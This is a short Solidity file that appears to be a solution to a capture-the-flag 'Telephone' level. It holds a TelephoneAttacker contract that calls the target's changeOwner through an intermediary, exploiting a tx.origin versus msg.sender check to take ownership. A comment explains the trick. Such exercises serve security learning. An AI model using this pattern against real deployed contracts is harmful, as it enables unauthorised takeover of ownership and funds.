// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./4-Telephone.sol";

contract TelephoneAttacker {
    Telephone public telephone;

    constructor(address TelephoneAddress) public {
        telephone = Telephone(TelephoneAddress);
    }

    function changeOwner() external {
        /*By call function changeOwner from this
        contract we change value msg.sender which will
        see the Telephone contract to address of this
        contract. But tx.origin will have address of 
        account which call this function. */
        telephone.changeOwner(msg.sender);
    }
}
